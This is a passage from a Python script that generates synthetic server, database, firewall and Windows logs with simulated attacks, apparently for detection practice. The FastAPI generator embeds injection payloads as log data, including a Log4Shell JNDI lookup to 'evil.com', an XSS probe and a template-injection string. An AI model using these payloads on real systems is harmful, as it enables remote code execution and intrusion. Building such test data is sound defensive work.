
        if provider == "Application Error":
            event_id = 1000
            app = random.choice(
                ["chrome.exe", "outlook.exe", "notepad.exe", "sqlservr.exe"]
            )
            msg = f"Faulting application name: {app}, version: 1.0.0.0, faulting module: ntdll.dll"
        elif provider == "MSSQLSERVER":
            event_id = random.choice([17137, 18456, 833])
            msg = random.choice(
                [
                    "SQL Server is now ready for client connections",
                    "Login failed for user 'sa'",
                    "I/O requests taking longer than 15 seconds",
                ]
            )
        else:
            event_id = random.randint(1, 5000)
            msg = f"Application event from {provider}"

        logs.append(f"{ts},{event_id},{level},Application,{machine},{provider},{msg}")

    # ATTACK: Application crashes after exploitation attempts
    for _ in range(100):
        ts = random_timestamp(base_time).strftime("%Y-%m-%d %H:%M:%S")
        machine = random.choice(HOSTNAMES).upper()
        app = random.choice(["w3wp.exe", "sqlservr.exe", "svchost.exe"])
        msg = f"Faulting application name: {app}, Exception code: 0xc0000005 (Access Violation)"
        logs.append(f"{ts},1000,Error,Application,{machine},Application Error,{msg}")

    while len(logs) < LINES_PER_LOG:
        ts = random_timestamp(base_time).strftime("%Y-%m-%d %H:%M:%S")
        machine = random.choice(HOSTNAMES).upper()
        logs.append(
            f"{ts},1001,Information,Application,{machine},Windows Error Reporting,Fault bucket submitted"
        )

    return logs


# ==================== ADDITIONAL WEBSERVER LOGS ====================


def generate_fastapi_logs() -> List[str]:
    """Generate FastAPI logs (JSON format)"""
    logs = []
    base_time = datetime.now() - timedelta(hours=24)

    for _ in range(int(LINES_PER_LOG * 0.7)):
        ts = format_iso_timestamp(random_timestamp(base_time))
        ip = random.choice(EXTERNAL_IPS + INTERNAL_IPS)
        method = random.choice(["GET", "POST", "PUT", "DELETE", "PATCH"])
        url = random.choice(URLS)
        status = random.choice([200, 200, 200, 201, 400, 404, 422, 500])
        duration = random.uniform(0.001, 2.0)

        log_entry = f'{{"timestamp":"{ts}","level":"INFO","message":"Request completed","method":"{method}","url":"{url}","status_code":{status},"client_ip":"{ip}","duration_ms":{duration * 1000:.2f}}}'
        logs.append(log_entry)

    # ATTACK: Validation errors (422) from injection attempts
    for attacker_ip in ATTACKER_IPS:
        for _ in range(30):
            ts = format_iso_timestamp(random_timestamp(base_time))
            malicious = random.choice(
                MALICIOUS_SQL
                + ["<script>alert(1)</script>", "{{7*7}}", "${jndi:ldap://evil.com/a}"]
            )
            log_entry = f'{{"timestamp":"{ts}","level":"WARNING","message":"Validation error","method":"POST","url":"/api/users","status_code":422,"client_ip":"{attacker_ip}","detail":"Invalid input: {malicious[:30]}..."}}'
            logs.append(log_entry)

    # ATTACK: Rate limiting triggered
    for attacker_ip in ATTACKER_IPS[:5]:
        for _ in range(20):
            ts = format_iso_timestamp(random_timestamp(base_time))
            log_entry = f'{{"timestamp":"{ts}","level":"WARNING","message":"Rate limit exceeded","client_ip":"{attacker_ip}","requests_per_minute":150}}'
            logs.append(log_entry)

    while len(logs) < LINES_PER_LOG:
        ts = format_iso_timestamp(random_timestamp(base_time))
        log_entry = f'{{"timestamp":"{ts}","level":"INFO","message":"Health check","method":"GET","url":"/health","status_code":200,"duration_ms":1.5}}'
        logs.append(log_entry)

    random.shuffle(logs)
    return sorted(logs, key=lambda x: x[:35] if "timestamp" in x else x)


# Main execution
def main():
    generators = {
        # Auth logs
        "auth/ssh_auth.log": generate_ssh_auth_logs,
        "auth/pam.log": generate_pam_logs,
        "auth/vsftpd.log": generate_vsftpd_logs,
        "auth/proftpd.log": generate_proftpd_logs,
        # Database logs
        "database/mysql_error.log": generate_mysql_error_logs,
        "database/mysql_query.log": generate_mysql_query_logs,
        "database/mysql_slow.log": generate_mysql_slow_logs,
        "database/postgres_error.log": generate_postgres_error_logs,
        "database/postgres_auth.log": generate_postgres_auth_logs,
        "database/postgres_statement.log": generate_postgres_statement_logs,
        "database/oracle_alert.log": generate_oracle_alert_logs,
        "database/oracle_listener.log": generate_oracle_listener_logs,
        "database/oracle_audit.log": generate_oracle_audit_logs,
        "database/sqlserver_error.log": generate_sqlserver_error_logs,
        "database/sqlserver_audit.log": generate_sqlserver_audit_logs,
        "database/sqlserver_transaction.log": generate_sqlserver_transaction_logs,
        "database/mongodb_server.log": generate_mongodb_server_logs,
        "database/mongodb_audit.log": generate_mongodb_audit_logs,
        # Webserver logs
        "webserver/apache_access.log": generate_apache_logs,
        "webserver/nginx_access.log": generate_nginx_logs,
        "webserver/iis.log": generate_iis_logs,
        "webserver/django.log": generate_django_logs,
        "webserver/flask.log": generate_flask_logs,
        "webserver/laravel.log": generate_laravel_logs,
        "webserver/express.log": generate_express_logs,
        "webserver/gunicorn.log": generate_gunicorn_logs,
        "webserver/uvicorn.log": generate_uvicorn_logs,
        "webserver/rails.log": generate_rails_logs,
        "webserver/fastapi.log": generate_fastapi_logs,
        # System logs
        "system/syslog.log": generate_syslog_logs,
        "system/systemd.log": generate_systemd_logs,
        "system/kernel.log": generate_kernel_logs,
        "system/audit.log": generate_audit_logs,
        "system/cron.log": generate_cron_logs,
        "system/daemon.log": generate_daemon_logs,
        # Firewall logs
        "firewall/iptables.log": generate_iptables_logs,
        "firewall/ufw.log": generate_ufw_logs,
        "firewall/nftables.log": generate_nftables_logs,
        "firewall/firewalld.log": generate_firewalld_logs,
        "firewall/windows_firewall.log": generate_windows_firewall_logs,
        "firewall/palo_alto.log": generate_palo_alto_logs,
        "firewall/fortigate.log": generate_fortigate_logs,
        "firewall/cisco_asa.log": generate_cisco_asa_logs,
        "firewall/checkpoint.log": generate_checkpoint_logs,
        "firewall/aws_vpc_flow.log": generate_aws_vpc_flow_logs,
        "firewall/azure_nsg.log": generate_azure_nsg_logs,
        "firewall/gcp_vpc.log": generate_gcp_vpc_logs,
        # Network logs
        "network/dns.log": generate_dns_logs,
        "network/dhcp.log": generate_dhcp_logs,
        "network/proxy.log": generate_proxy_logs,
        # Windows logs
        "windows/security.log": generate_windows_security_logs,
        "windows/system.log": generate_windows_system_logs,
        "windows/application.log": generate_windows_application_logs,
        # Mail logs
        "mail/postfix.log": generate_postfix_logs,
        "mail/sendmail.log": generate_sendmail_logs,
        "mail/exim.log": generate_exim_logs,
        "mail/dovecot.log": generate_dovecot_logs,
        "mail/exchange.log": generate_exchange_logs,
    }

    print(f"Generating {len(generators)} log files with {LINES_PER_LOG} lines each...")
    print(f"Output directory: {OUTPUT_DIR}")
    print("-" * 60)

    for filename, generator in generators.items():
        filepath = os.path.join(OUTPUT_DIR, filename)
        print(f"Generating {filename}...", end=" ", flush=True)

        try:
            logs = generator()
            with open(filepath, "w") as f:
                f.write("\n".join(logs))
            print(f"Done ({len(logs)} lines)")
        except Exception as e:
            print(f"Error: {e}")

    print("-" * 60)
    print("Log generation complete!")
    print(f"\nAttack patterns included:")
    print("  - Brute force attacks (SSH, FTP, databases, mail)")
    print("  - Password spray attacks")
    print("  - SQL injection attempts")
    print("  - XSS attacks")
    print("  - Path traversal attempts")
    print("  - Directory scanning/enumeration")
    print("  - Port scanning")
    print("  - DDoS traffic patterns")
    print("  - Privilege escalation attempts")
    print("  - Unauthorized access attempts")
    print("  - Spam/relay attempts (mail)")
    print(f"\nAttacker IPs used: {', '.join(ATTACKER_IPS[:5])}...")


if __name__ == "__main__":
    main()
